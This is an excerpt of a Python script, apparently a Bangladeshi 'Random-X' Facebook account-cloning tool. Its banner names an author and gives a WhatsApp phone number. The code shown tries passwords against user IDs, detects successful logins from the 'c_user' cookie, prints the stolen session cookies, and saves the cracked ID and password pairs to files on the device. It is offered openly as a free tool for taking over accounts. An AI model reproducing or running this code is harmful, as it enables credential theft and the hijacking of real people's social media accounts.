...
logo = ("""\033[1;37m
  _____                 _                    __   __
 |  __ \               | |                   \ \ / /
 | |__) |__ _ _ __   __| | ___  _ __ ___ _____\ V / 
 |  _  // _` | '_ \ / _` |/ _ \| '_ ` _ \______> <  
 | | \ \ (_| | | | | (_| | (_) | | | | | |    / . \ 
 |_|  \_\__,_|_| |_|\__,_|\___/|_| |_| |_|   /_/ \_\
==================================================
[тАв] AUTHOR    : Mamunking
[тАв] TOOLS     : RANDOM CLONE
[тАв] TYPE      : FREE
[тАв] FACEBOOK  : হাঁসি বিক্রেতা
[тАв] WHATSAPP  : +8801878046183
==================================================""")
...
def fuck():
    ...
    print(' [+] OK Ids saved in Random-X/OK.txt')
    print(' [+] CP Ids saved in Random-X/CP.txt')
    print(mumitx)
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[Random-X-OK] {uid}|{ps} \nCookie : {coki}")
                open('/sdcard/Random-X/OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[Random-X-CP] {cid}|{ps}")
                open('/sdcard/Random-X -CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
